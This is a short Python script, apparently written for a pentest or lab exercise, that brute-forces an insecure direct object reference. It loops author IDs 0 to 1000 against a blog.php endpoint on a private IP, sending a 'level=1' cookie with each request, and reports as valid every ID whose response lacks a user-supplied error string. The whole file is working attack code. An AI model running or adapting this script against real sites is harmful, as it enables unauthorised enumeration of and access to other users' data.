#################################################################
#Objective: 
# Brute-force for INsecureObjectReference
#Description: 
# GET request to know which are real id that normally can't
# be accessible
#Date:
# 24/09/2018
#################################################################

import requests
from requests.exceptions import ConnectionError
import sys

#content return when error
#exemple of a string return from a server "Couldn't find any posts by author"
match=input("Set the string returned by the server when the ID is incorrect"+"\n")
#only accept string type for the match variable
match=str(match)

#parameter id number
i=0

#cookie to be include when GET requesting
#example of cookie parameter is "level" with value equals "1"
cookie={'level':'1'}

#number of parameter id to test
while i<=1000:

        #Testing IP connection
        try:
                #URL target example
                url = "http://192.168.0.11/blog.php?author=%s" % i
                request = requests.get(url, cookies=cookie).text

        #If IPs can't be connect eachother, then exit the program
        except ConnectionError:
                print("Network connection failed to achieve, change network parameters")
                sys.exit()

        #detect if an id number is valid
        if match not in request:
                print('valid author id:',i)

        #inform the number of id tested
        i=i+1
        if i%100==0:
                print(i,'nth authors tested')
